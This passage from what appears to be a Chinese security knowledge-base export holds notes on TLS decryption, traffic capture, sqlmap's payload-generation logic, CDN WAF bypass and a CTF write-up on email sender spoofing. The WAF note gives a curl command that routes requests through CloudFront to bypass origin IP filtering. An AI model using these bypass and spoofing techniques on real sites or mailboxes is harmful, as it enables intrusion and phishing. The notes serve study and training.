第二步：创造一个高层级的设计\r\n使用所有重要的组件来描绘出一个高层级的设计。\r\n\r\n- 画出主要的组件和连接\r\n- 证明你的想法\r\n\r\n# 第三步：设计核心组件\r\n对每一个核心组件进行详细深入的分析。举例来说，如果你被问到[设计一个 url 缩写服务](https://github.com/donnemartin/system-design-primer/blob/master/solutions/system_design/pastebin/README.md)，开始讨论：\r\n\r\n生成并储存一个完整 url 的 hash\r\n\r\n- MD5 和 Base62\r\n- Hash 碰撞\r\n- SQL 还是 NoSQL\r\n- 数据库模型\r\n\r\n将一个 hashed url 翻译成完整的 url\r\n- 数据库查找\r\nAPI 和面向对象设计\r\n\r\n# 第四步：扩展设计\r\n确认和处理瓶颈以及一些限制。举例来说就是你需要下面的这些来完成扩展性的议题吗？\r\n- 负载均衡\r\n- 水平扩展\r\n- 缓存\r\n- 数据库分片\r\n- 论述可能的解决办法和代价。每件事情需要取舍。可以使用[可扩展系统的设计原则](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E4%B8%BB%E9%A2%98%E7%9A%84%E7%B4%A2%E5%BC%95)来处理瓶颈。\r\n\r\n# 第五步：预估计算量\r\n你或许会被要求通过手算进行一些估算。[附录](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#%E9%99%84%E5%BD%95)涉及到的是下面的这些资源：\r\n- [使用预估计算量](http://highscalability.com/blog/2011/1/26/google-pro-tip-use-back-of-the-envelope-calculations-to-choo.html)\r\n- [2 的次方表](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#2-%E7%9A%84%E6%AC%A1%E6%96%B9%E8%A1%A8)\r\n- [每个程序员都应该知道的延迟数](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84%E5%BB%B6%E8%BF%9F%E6%95%B0)\r\n\r\n# 相关资源和延伸阅读\r\n- [怎样通过一个系统设计的面试](https://www.palantir.com/2011/10/how-to-rock-a-systems-design-interview/)\r\n- [系统设计的面试](http://www.hiredintech.com/system-design)\r\n- [系统架构与设计的面试简介](https://www.youtube.com/watch?v=ZgdS0EUmn70)\r\n- [https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/网络基础设施/加密流量解决方案/","title":"加密流量解决方案"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 加密流量解决方案\r\ntags:\r\n  - Blue Team基础设施\r\n  - 网络基础设施\r\n  - 加密流量\r\n  - 行业实践\r\n  - Palo Alto Networks\r\n  - Extrahop\r\n  - Gigamon\r\n  - Google\r\n---\r\n\r\n# 1. 基础知识\r\n**X.509 证书：** 证书在客户端和服务器之间建立信任以建立 SSL 连接，尝试对服务器进行身份验证（或对客户端进行身份验证的服务器）的客户端知道 X.509 证书的结构，因此知道如何从证书中的字段中提取有关服务器的标识信息，例如 FQDN 或 IP 地址（称为证书中的通用名称或CN）或颁发证书的组织、部门或用户的名称。证书颁发机构 (CA) 必须颁发所有证书。CA 验证客户端或服务器后，CA 颁发证书并使用私钥对其进行签名。\r\n\r\n# 2. [[Palo Alto Networks]] Solution\r\n**解密策略：** 防火墙必须在其证书信任列表 (CTL) 中拥有服务器根 CA 证书，并使用该根 CA 证书中包含的公钥来验证签名，然后防火墙提供一份由转发信任证书签名的服务器证书的副本，供客户端进行身份验证。\r\n- **Outbound SSL traffic：SSL Forward Proxy**\r\n  - 防火墙是内部客户端和外部服务器之间的中间人。防火墙使用证书将客户端透明地表示给服务器，并将服务器透明地表示给客户端，这样客户端就认为它是直接与服务器通信的（即使客户端会话是与防火墙进行的），服务器也相信它直接与客户端通信（即使服务器会话也与防火墙）。防火墙使用证书将自己建立为客户端-服务器会话的可信第三方（中间人）。\r\n  - ![dsbk1w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/dsbk1w.jpg)\r\n- **Inbound SSL traffic：SSL Inbound Inspection**\r\n  - 为要执行 SSL 入站检查的每台服务器安装证书和私钥。您还必须在每个执行 SSL 入站检查的防火墙上安装公钥证书和私钥。防火墙执行 SSL 入站检查的方式取决于协商的密钥类型、Rivest、Shamir、Adleman (RSA) 或 Perfect Forward Secrecy ( PFS )。\r\n  - ![SNxlAy](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/SNxlAy.jpg)\r\n- **Tunneled SSH traffic：SSH Proxy**\r\n  - 在 SSH 代理配置中，防火墙位于客户端和服务器之间。SSH 代理使防火墙能够解密入站和出站 SSH 连接，并确保攻击者不会使用 SSH 对不需要的应用程序和内容进行隧道传输。SSH 解密不需要证书，防火墙在启动时会自动生成用于 SSH 解密的密钥。在启动过程中，防火墙会检查是否存在现有密钥。如果没有，防火墙会生成一个密钥。防火墙使用密钥解密防火墙上配置的所有虚拟系统的 SSH 会话和所有 SSH v2 会话。\r\n\r\n# 3. [[Extrahop]] Solution\r\n**TLS 1.3发展带来的问题：Perfect Forward Secrecy**\r\n- 以前版本的 TLS：使用静态DH密钥交换算法很容易解密。\r\n- TLS1.3(PFS) 使用 ECDHE(Elliptic Curve Diffie-Hellman Encryption 密钥协商算法，握手过程中客户端和服务端都需要临时生成椭圆曲线公私钥，这样即使会话密钥被泄露，也无法解密所有会话。\r\n解决方案：\r\n- **中间人劫持：** 串行方案，解密，分析，然后重新加密传输\r\n- **带外监控与解密：** 并行方案，流量镜像实现\r\n\r\n\r\n**ExtraHop Reveal(x)使用带外解密方案**\r\n- 数据获取：Reveal(x) 使用 Microsoft Azure vTAP 或 Amazon VPC 流量镜像来获取数据包。\r\n- 隐私保护：遵循HIPAA, PCI, SOX, GDPR等法案，客户需要自己选择要解密的流量。\r\n- TLS1.3方案：ExtraHop Reveal(x) 使用轻量级的agent获取每个会话的临时会话密钥，该agent需要安装要解密的每台服务器上；agent通过 PFS 加密通道将解密后的会话安全地传输到 ExtraHop Reveal(x) 设备，在那里它们被安全存储并且只有具有最高管理权限的用户才能访问。\r\n- ![wfT2AN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/wfT2AN.jpg)\r\n\r\n# 4. [[Gigamon]] Solution\r\n![7UduQ4](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/7UduQ4.jpg)\r\n\r\n- **入站加密流量：** 证书托管\r\n- **出站加密流量：** 中间人劫持（本地信任CA）\r\n\r\n![DaE7NT](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/DaE7NT.jpg)\r\n\r\n# 5. [[Google]] Cloud IDS Solution\r\n\r\n刚上线不久，可能还未考虑到加密流量的情况\r\n\r\n![b9GRnf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/b9GRnf.jpg)\r\n\r\n# 6. 参考资料\r\n\r\n- [https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-admin/decryption/decryption-overview](https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-admin/decryption/decryption-overview)\r\n- [https://www.extrahop.com/products/cloud/how-it-works](https://www.extrahop.com/products/cloud/how-it-works)\r\n- [http://blog.nsfocus.net/east-west-flow-sum](http://blog.nsfocus.net/east-west-flow-sum)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/网络基础设施/网络流量采集方案/","title":"网络流量采集方案"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 网络流量采集方案\r\ntags:\r\n- Blue Team基础设施\r\n- 网络基础设施\r\n- 行业实践\r\n- Gigamon\r\n---\r\n\r\n# 1. 基础知识\r\n两种最常见的网络流量采集方法是网络分路器(TAPs) 和交换机端口镜像(SPANs):\r\n**1.1. 网络分路器(TAPs)**\r\n一种直接连接到网络基础设施的物理设备。 TAP 位于两个设备之间，而不是两个交换机或路由器之间；并行方案，通过拷贝流量副本进行监控，不影响原始网络通讯，这种技术确保任何大小的数据包都将被拷贝并且**不容易超载**。\r\n如下图所示，Web服务器和交换机之间的流量数据被TAP设备捕获拷贝(TxA:A->B, TxB:B->A)，大多数TAP设备分别复制两个方向的流量数据，并将它们发送到单独的监控端口（TxA和TxB）\r\n![qTtJbp](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/qTtJbp.jpg)\r\n\r\n**1.2. 交换机端口镜像(SPANs)**\r\nSPAN 端口（有时称为镜像端口）是一种内置于交换机或路由器的软件功能，可拷贝通过设备的选定流量数据包的副本，并将它们发送到指定的 SPAN 端口。 由于交换机或路由器的主要目的是转发生产数据包，因此 SPAN 数据在设备上的优先级较低，SPAN 还使用单个出口端口来聚合多个链路，因此**很容易超载**。SPAN 最适合在未安装 TAP 的位置对少量数据进行临时监控。（注：SPAN 仍然是访问某些类型数据的唯一方式，例如在同一交换机上跨端口到端口的数据）\r\n\r\n![xKSTiK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/xKSTiK.jpg)\r\n\r\n# 2. 东西向流量采集\r\n传统TAP和SPAN的方案在东西向流量采集有两个难点：**1、无法采集同一宿主机内的两台虚拟机之间的流量。2、封装了vxlan等隧道包头的数据流量无法识别**。\r\n\r\n业界主流的方案有（TAP/SPAN的基础上）：\r\n- SDN：通过SDN控制器的全网控制能力，实现东西向流量采集\r\n- API接口：通过调用云计算系统的标准引流API，实现东西向流量采集\r\n- 代理：非SDN网络下，添加一个引流的代理，实现东西向流量采集\r\n- Agent：通过在终端部署软件来实现东西向流量采集\r\n- vxlan：在虚机上做镜像，把流量通过vxlan导出去，送到一台支持vxlan终结的交换机上去，这台交换机把vxlan剥离后，送给旁挂的设备进行流量采集\r\n\r\n# 3. Gigamon Solution\r\n- **无源TAP**\r\n  - 无源TAP是在其网络端口之间没有物理隔离的设备，它从网络的两个方向接收流量，以便在监视工具上看到100％的流量。无源TAP不需要任何电源，增加了一层冗余，几乎不需要维护，并减少了总费用。\r\n- **有源TAP**\r\n  - 有源TAP在网络端口之间具有物理隔离。因此，它们需要一种故障安全机制，以确保在TAP断电时网络保持可操作状态；**有源TAP通常在下面的场景使用（无源TAP不适用）**：\r\n    1. Locations where the light levels are too low to use a splitter → regeneration provides a viable solution\r\n    2. Copper infrastructures → where electricity is used to move electrons (instead of photons)\r\n    3. Signal conversions → since an active TAP regenerates the signal anyway, it can also be designed to create a signal of a different type (such as 10Gb SR converted to 10Gb LR)\r\n    4. SFP-based links that cannot otherwise be broken (such as TwinAX cabling) → regeneration works here as well\r\n- **虚拟TAP**\r\n  - 用于网络功能虚拟化 (NFV) 以及私有和公共云基础架构，以访问托管环境中的东西向和南北向流量。\r\n  - ![hKxsTy](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/hKxsTy.jpg)\r\n\r\n# 4. 参考资料\r\n- [https://www.gigamon.com/resources/resource-library/white-paper/to-tap-or-to-span.html](https://www.gigamon.com/resources/resource-library/white-paper/to-tap-or-to-span.html)\r\n- [https://www.gigamon.com/resources/resource-library/white-paper/understanding-network-taps-first-step-to-visibility.html](https://www.gigamon.com/resources/resource-library/white-paper/understanding-network-taps-first-step-to-visibility.html)\r\n- [https://www.secrss.com/articles/12651](https://www.secrss.com/articles/12651)\r\n- [http://blog.nsfocus.net/east-west-flow-sum](http://blog.nsfocus.net/east-west-flow-sum)"},{"fields":{"slug":"/安全知识库/Red Team能力建设/初始访问 Initial Access/SQL注入/SQLmap payload生成逻辑/","title":"SQLmap payload生成逻辑"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: SQLmap payload生成逻辑\r\ntags:\r\n- Red Team能力建设\r\n- 初始访问 Initial Access\r\n- SQL注入\r\n- SQLmap\r\n---\r\n\r\n# test和boundary组合生成payload\r\n这部分主要梳理sqlmap生成payload的方式，sqlmap扫描规则文件位于xml文件夹中的boundaries.xml文件和payloads文件夹，payloads文件夹中存放了六种注入类型的xml文件。\r\n\r\n- boolean_blind\r\n- error_based\r\n- inline_query\r\n- stacked_queries\r\n- time_blind\r\n- union_query\r\n\r\n最终payload的生成方式为: prefix + payload + comment + suffix, 其中prefix和suffix由boundaries中的子节点prefix和suffix提供，payload和comment由payloads文件夹中的test的子节点payload和comment提供。\r\n\r\n# 解析test\r\ntest节点的格式如下：\r\n\r\n```\r\n  <test>\r\n      <title></title>\r\n      <stype></stype>\r\n      <level></level>\r\n      <risk></risk>\r\n      <clause></clause>\r\n      <where></where>\r\n      <vector></vector>\r\n      <request>\r\n          <payload></payload>\r\n          <comment></comment>\r\n          <char></char>\r\n          <columns></columns>\r\n      </request>\r\n      <response>\r\n          <comparison></comparison>\r\n          <grep></grep>\r\n          <time></time>\r\n          <union></union>\r\n      </response>\r\n      <details>\r\n          <dbms></dbms>\r\n          <dbms_version></dbms_version>\r\n          <os></os>\r\n      </details>\r\n  </test>\r\n```\r\n\r\n- title\r\n  - 当前测试Payload的标题，通过标题可以了解当前的注入类型以及测试的数据库类型\r\n- stype\r\n  - SQL注入的类型, 可能的值和代表的意义如下\r\n    - Boolean-based blind SQL injection\r\n    - Error-based queries SQL injection\r\n    - Inline queries SQL injection\r\n    - Stacked queries SQL injection\r\n    - Time-based blind SQL injection\r\n    - UNION query SQL injection\r\n- level\r\n  - 测试SQL注入的深度，共有5个级别，级别越高发送的请求数越多。这和boundary子节点level的含义是一致的\r\n    - Always (<100 requests)\r\n    - Try a bit harder (100-200 requests)\r\n    - Good number of requests (200-500 requests)\r\n    - Extensive test (500-1000 requests)\r\n    - You have plenty of time (>1000 requests)\r\n- risk\r\n  - 测试payload破坏数据完整性的可能性。\r\n    - Low risk\r\n    - Medium risk\r\n    - High risk\r\n- clause[多个值用,分隔]\r\n  - payload在哪个字段位置生效, 这和boundary子节点clause的含义是一致的\r\n    - Always\r\n    - WHERE / HAVING\r\n    - GROUP BY\r\n    - ORDER BY\r\n    - LIMIT\r\n    - OFFSET\r\n    - TOP\r\n    - Table name\r\n    - Column name\r\n    - Pre-WHERE (non-query)\r\n- where[多个值用,分隔]\r\n  - 添加完整payload`<prefix>`,`<payload>`,`<comment>`,`<suffix>`的地方, 这和boundary子节点where的含义是一致的\r\n  - Append the string to the parameter original value\r\n  - Replace the parameter original value with a negative random integer value and append our string\r\n  - Replace the parameter original value with our string\r\n- vector\r\n  - 注入向量\r\n- request\r\n  - 注入测试发送的请求\r\n    - payload\r\n      - 测试使用的payload, 其中的[RANDNUM]，[DELIMITER_STAR]，[DELIMITER_STOP]分别代表着随机数值与字符, 扫描时会用对应的随机数替换掉。\r\n    - comment\r\n      - 添加在payload后面的注释\r\n    - char\r\n      - 在union注入测试中暴力破解列数所使用的字符\r\n    - columns\r\n      - 在union注入测试中测试列的范围， 如<columns>[COLSTART]-[COLSTOP]</columns>\r\n- response\r\n  - 从响应中识别是否成功注入\r\n    - comparison(布尔盲注)\r\n      - 应用比较算法，比较两次请求响应的不同，一次请求的payload使用request子节点中的payload, 另一次请求的payload使用response子节点中的comparison\r\n    - grep(报错注入)\r\n      - 响应中匹配的正则表达式\r\n    - time(时间盲注和堆叠注入)\r\n      - 响应返回之前等待的时间(单位为秒)\r\n    - union(union注入)\r\n      - 调用 unionTest()函数\r\n- details\r\n  - 注入成功能得到的关于操作系统和数据库相关的信息\r\n    - dbms\r\n  - 使用的数据库类型\r\n    - dbms_version\r\n  - 数据库版本\r\n    - os\r\n  - 运行数据库得操作系统\r\n\r\n# 解析boundaries\r\nboundary节点的格式如下:\r\n\r\n```\r\n  <boundary>\r\n      <level></level>\r\n      <clause></clause>\r\n      <where></where>\r\n      <ptype></ptype>\r\n      <prefix></prefix>\r\n      <suffix></suffix>\r\n  </boundary>\r\n```\r\n\r\n其中`level`, `clause`, `where`表示的含义和test节点中所表示的含义是一致的。\r\n\r\n- ptype\r\n  - 测试参数的类型\r\n    - Unescaped numeric\r\n    - Single quoted string\r\n    - LIKE single quoted string\r\n    - Double quoted string\r\n    - LIKE double quoted string\r\n- prefix\r\n  - ``<payload>``,``<comment>``添加的前缀\r\n- suffix\r\n  - `<payload>`,`<comment>`添加的后缀\r\n\r\n# 源码解析payload组合\r\nsqlmap使用`lib/controller/checks.py`文件中的`checkSqlInjection()`函数进行sql注入的测试, 其中利用test和boundary生成payload的主要代码如下，忽略其他逻辑判断\r\n\r\n```\r\n  # Favoring non-string specific boundaries in case of digit-like parameter values\r\n  if value.isdigit():\r\n      kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or \"\") or _ in (boundary.suffix or \"\") for _ in ('\"', '\\'')))\r\n      boundaries = kb.cache.intBoundaries\r\n  else:\r\n      boundaries = conf.boundaries\r\n  \r\n  tests = getSortedInjectionTests()\r\n  \r\n  while tests:\r\n      test = tests.pop(0)\r\n  \r\n      for boundary in boundaries:\r\n          injectable = False\r\n  \r\n          # Skip boundary if it does not match against test's <clause>\r\n          # Parse test's <clause> and boundary's <clause>\r\n          clauseMatch = False\r\n  \r\n          for clauseTest in test.clause:\r\n              if clauseTest in boundary.clause:\r\n                  clauseMatch = True\r\n                  break\r\n  \r\n          if test.clause != [0] and boundary.clause != [0] and not clauseMatch:\r\n              continue\r\n  \r\n          # Skip boundary if it does not match against test's <where>\r\n          # Parse test's <where> and boundary's <where>\r\n          whereMatch = False\r\n  \r\n          for where in test.where:\r\n              if where in boundary.where:\r\n                  whereMatch = True\r\n                  break\r\n  \r\n          if not whereMatch:\r\n              continue\r\n  \r\n          # For each test's <where>\r\n          for where in test.where:\r\n              # generage payload\r\n              templatePayload = agent.payload(..., where=where)\r\n```\r\n\r\n利用test和boundary生成payload的流程为:\r\n\r\n- 循环遍历每一个test,\r\n- 对某个test,循环遍历boundary\r\n- 若boundary的where包含test的where值，并且boundary的clause包含test的clause值, 则boundary和test可以匹配\r\n- 循环test的where值,结合匹配的boundary生成相应的payload\r\n\r\n# 参考资料\r\n- [http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/](http://www.beesfun.com/2017/03/30/sqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload/)"},{"fields":{"slug":"/安全知识库/Red Team能力建设/初始访问 Initial Access/绕过 Bypass/绕过CDN WAF防护/","title":"绕过CDN WAF防护"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 绕过CDN WAF防护\r\ntags:\r\n- Red Team能力建设\r\n- 初始访问 Initial Access\r\n- 绕过 Bypass\r\n---\r\n\r\n# 找到源主机IP\r\n记的很久之前在乌云上看到篇文章，通过使用 zmap 对全 CN 的 IP 的 80、443 端口进行扫描，通过banner对比得到真实IP。\r\n\r\n上面的方案是有一定的缺陷的：\r\n\r\n1. 无法对响应做匹配，且字符串匹配可能不准确\r\n2. 源站只允许CDN访问，无法直接访问怎么办？\r\n\r\n## 问题一：使用工具Hakoriginfinder\r\nHakoriginfinder 是一个 golang 工具，它会向每个 IP 地址发出 HTTP 和 HTTPS 请求，尝试通过将响应与真实网站的响应进行比较来找到源主机，并且使用 Levenshtein 算法找到相似的响应。\r\n\r\n速度肯定不如zmap那么快。\r\n\r\n- https ://github.com/hakluke/hakoriginfinder\r\n\r\n## 问题二：使用CDN基础设施来绕过限制\r\n以AWS环境为例\r\n\r\n- CloudFlare 和 CloudFront 等CDN服务，会使用共享的 IP 范围来对源站进行访问\r\n- 使用CloudFront时，我们可以在HTTP请求添加任意header\r\n\r\n这些条件可以绕过问题二提到的限制，方法是通过控制的一个路由，这个未经过滤的请求可以绕过源头的任何 IP 限制，因为它来自与合法请求相同的 IP 范围，如下图：\r\n\r\n- ![36gDd6](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/36gDd6.jpg)\r\n\r\n这里的核心涉及AWS CDN使用的HTTP header字段\r\n\r\n- **Cdn-Proxy-Origin**, 此字段是必填的，需要设置为通过 CloudFront 转发后，路由要到达目标的主机名或IP\r\n- **Cdn-Proxy-Host**, 此字段是可选的，内容为通过 CloudFront 转发后，Host 字段的值，如果未设置，它将默认为 Cdn-Proxy-Origin 的值\r\n- **X-Forwarded-For**, 此字段是可选的，内容为通过 CloudFront 转发后，HTTP header中的xff字段，如果未设置，则为一个随机IP\r\n\r\n比如，下面的请求通过 CloudFront 后转发到公共 ifconfig.me 服务，返回的 IP 将是我们从 CloudFront 网络发出的请求的源 IP\r\n\r\n```\r\n  curl -H 'Cdn-Proxy-Origin: ifconfig.me' -H 'Cdn-Proxy-Host: ifconfig.me' XXXXXXXXXXXXX.cloudfront.net\r\n```\r\n\r\n# 参考资料\r\n- [https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html](https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html)"},{"fields":{"slug":"/安全知识库/Red Team能力建设/初始访问 Initial Access/钓鱼 Phishing/DataCon2021优秀解题思路分享-邮件发件人伪造（武汉大学 10TG）/","title":"DataCon2021优秀解题思路分享-邮件发件人伪造（武汉大学 10TG）"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: DataCon2021优秀解题思路分享-邮件发件人伪造（武汉大学 10TG）\r\ntags:\r\n- Red Team能力建设\r\n- 初始访问 Initial Access\r\n- 钓鱼\r\n- SMTP\r\n---\r\n\r\n# 背景\r\n邮件发件协议主要是SMTP(Simple Mail Transfer Protocol)，但是SMTP协议设计之初并没有考虑到太多安全相关的功能，因此导致邮件发件人伪造的攻击层出不穷。\r\n\r\n一个典型的邮件从发送方编写到接收方看到邮件内容的过程如下图所示\r\n\r\n![5htp7U](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/5htp7U.jpg)\r\n\r\n- 发送方通过SMTP协议发给发送方的MTA(Mail Transmission Agent)\r\n- 发送方的MTA通过SMTP协议发给接收方的MTA\r\n- 最终接收方使用POP3(Post Office Protocol)或IMAP(Internet Message Access Protocol)协议接收邮件\r\n\r\n在这个过程中传输的邮件有很多个字段都是用来指定发送方身份的\r\n\r\n- MailFrom SMTP.From, 这个字段可以理解为信封上指定的发件人\r\n- From Message.From, 展示给用户看到的信息上的发件人\r\n- Sender, 一般在代发邮件中用来标识代发邮件的来源\r\n\r\n这些多种的字段就导致实际邮件服务解析时不同邮件客户端可能对显示的内容处理方案不同，从而就导致了发件人伪造的攻击。\r\n\r\n这种攻击也在APT、钓鱼邮件等攻击中大量存在，因此发件人伪造攻击也是一个十分值得重视的邮件安全问题。\r\n\r\n# 邮件安全协议\r\n由于SMTP设计时并没有考虑相关的安全机制，为了保证其安全性陆续推出了SPF、DKIM、DMARC等安全协议。\r\n\r\n对于发件人伪造攻击，我们需要关注的是这些协议分别检查哪些字段，如何利用协议的缺陷绕过对应的安全保护机制\r\n\r\n- SPF\r\n  - ![bVMdw7](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bVMdw7.jpg)\r\n  - SPF协议是发件人的域名在DNS记录中加入一条TXT记录，其中包含允许的IP地址；\r\n  - 收件方接收到邮件后检查smtp.mail字段，如果发件人的IP在DNS的TXT记录中，则返回pass\r\n- DKIM\r\n  - ![oG2tLv](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/oG2tLv.jpg)\r\n  - DKIM是利用到密码学的签名协议，发件方首先需要在DNS记录上增加自己的公钥，发件时使用自己的私钥对邮件的内容进行签名，并将签名的结果写在邮件内容中，当收件人收到信件时向DNS请求公钥对信件内容进行校验。\r\n  - DKIM中几个比较重要的字段有：\r\n    - d 表示实际校验的域名\r\n    - h 表示签名内容的涵盖范围\r\n    - l 是可选参数，表示body的长度\r\n  - 其中l这个参数最初的目的是用于一些商业邮件底部的Unsubscribe相关按钮\r\n  - 指定了l参数的邮件有可能被伪造body\r\n- DMAR\r\n  - ![bKrOgm](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bKrOgm.jpg)\r\n  - 由于SPF协议只能保证发件人的IP是否是域名允许的IP，DKIM只能保证邮件的内容没有经过篡改，两者都没有保护最终收件人看到的From字段是否是一个正确且真实的，因此增加了DMARC协议。\r\n  - DMARC协议会根据SPF、DKIM两者验证的返回结果，以及对From字段做的**一致性检查**，最终给出一个结论，判断这封邮件是应当拒收还是接收。\r\n\r\n# 发件人伪造常见攻击类型\r\n![3FxZc2](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/3FxZc2.jpg)\r\n\r\n2021年USENIX的论文中提出了Direct MTA、Shared MTA、Forwarding MTA三种类型的攻击角度；\r\n\r\n另一方面也可以按照2020年USENIX中的分类方法：\r\n\r\n- Intra-Server\r\n- UI-mismatch\r\n- ambiguous-replay\r\n\r\n这两篇论文都写的很详细，具体内容在此不赘述\r\n\r\n在我们靶场做题中，主要使用到的思路是对From、Sender、MailFrom等内容进行变形，截断；\r\n\r\n最终的目的是：\r\n\r\n- MailFrom字段和Auth User保持一致；\r\n- From字段在SPF/DKIM校验时与MailFrom一致;\r\n- From/Sender字段显示给用户时显示我们希望伪造的内容；另外Level5、Level6涉及到USENIX2020中第六章针对DKIM的Replay Attack，这一章写的思路很清楚，并且攻击方法很详细。\r\n\r\n另外Level5、Level6涉及到USENIX2020中第六章针对DKIM的Replay Attack，这一章写的思路很清楚，并且攻击方法很详细。\r\n\r\n# 参考资料\r\n- [http://datacon.qianxin.com/blog/archives/277](http://datacon.qianxin.com/blog/archives/277)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/终端基础设施/EDR/2021 EPP魔力象限 EPP Magic Quadrant/","title":"2021 EPP魔力象限 EPP Magic Quadrant"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 2021 EPP魔力象限 EPP Magic Quadrant\r\ntags:\r\n- Blue Team基础设施\r\n- 终端基础设施\r\n- EDR\r\n---\r\n\r\n![https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ZP3Qyi.jpg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ZP3Qyi.jpg)\r\n\r\n# 1. 市场趋势\r\n- 到 2023 年底，云交付的 EPP 解决方案将超过 95% 。\r\n- 到 2025 年，50% 使用 EDR 的组织将使用托管检测和响应功能（MDR）。\r\n- 到 2025 年，60% 的 EDR 解决方案将包含来自多个安全控制源的数据，例如身份认证、CASB 和 DLP。\r\n\r\n# 2. 市场定义/描述\r\n- Gartner对EPP市场的定义如下：EPP提供了将agent或sensor部署到托管终端（包括 PC、服务器和其他设备）的工具；这些旨在防止一系列已知和未知的恶意软件和威胁，并提供免受此类威胁的保护；此外，它们还提供调查和补救任何逃避保护控制的事件的能力。\r\n- EPP的核心功能是：\r\n  - 预防和保护安全威胁，包括使用基于文件和无文件漏洞的恶意软件。\r\n  - 将控制（允许/阻止）应用于软件、脚本和进程的能力 。\r\n  - 使用对设备活动、应用程序和用户数据的行为分析来检测和预防威胁的能力 。\r\n  - 当漏洞利用逃避保护控制时进一步调查事件和/或获得补救指导的设施 。\r\n- EPP中经常出现的可选功能可能包括：\r\n  - 终端设备的资产、配置和策略管理的收集和报告 。\r\n  - 磁盘加密、本地防火墙设置等操作系统安全控制状态的管理和报告 。\r\n  - 扫描系统漏洞和报告/管理安全补丁安装的设施 。\r\n  - 能够报告互联网、网络和应用程序活动，以获得潜在恶意活动的其他迹象 。\r\n\r\n# 3. 市场概览\r\n- 勒索软件目前是所有组织面临的最大风险。\r\n- 远程办公显著加速了基于云的解决方案落地（存量占60%，增量占95%）。\r\n- 无文件攻击已经非常普及，使得基于行为的检测防护成为EDR工具的关键能力。\r\n- 采用EDR工具的最大障碍仍然是操作它们所需的技能和增加的总成本。\r\n- 为了缩小技能差距，提供监控和警报分类的MDR服务正变得越来越流行。\r\n- SolarWinds供应链攻击说明了EDR的价值和缺点；EDR并没有实时检测到SolarWinds攻击，但在阻止新发现的恶意行为非常有用。\r\n- SolarWinds 攻击还表明需要至少更好地集成来自身份和电子邮件的遥测数据，以及需要有效的篡改保护以确保代理不被禁用。\r\n- XDR正在成为EPP解决方案的最新关键功能。\r\n- 所有组织都需要优先级更高的加固指导。\r\n- EPP解决方案还可以添加移动端的威胁防御和与统一终端管理的集成，以减少整体管理负担。\r\n\r\n# 4. 准入准出原则\r\n- 所有供应商必须至少提供以下12项：\r\n  - 无需更新规则即可防御。\r\n  - 可以根据进程行为检测恶意活动。\r\n  - 可以将IOC/IOA数据集中存储分析。\r\n  - 能够检测防御无文件恶意文件的攻击。\r\n  - 检测到恶意软件时自动删除恶意软件，删除/隔离文件/终止进程。\r\n  - 能够在控制台压制/忽略误报。\r\n  - EPP控制台必须是基于云的SaaS服务，由供应商管理维护。\r\n  - 控制台和报告能够显示完整的进程树，以识别进程是如何产生的，并进行可操作的根本原因分析。\r\n  - 需提供威胁狩猎能力，控制台提供跨终端的IOC/IOA（如文件哈希、源/目标 IP、注册表项）搜索。\r\n  - 能够识别恶意软件并给出修复步骤或者实现回滚。\r\n  - 提供选项将威胁情报集成到管理控制台中。\r\n  - 能够防护常见应用程序漏洞和内存利用攻击。\r\n  - 当终端设备位于公司网络之外时，必须继续收集可疑事件数据。\r\n  - 能对文件夹、驱动器或设备（例如 USB 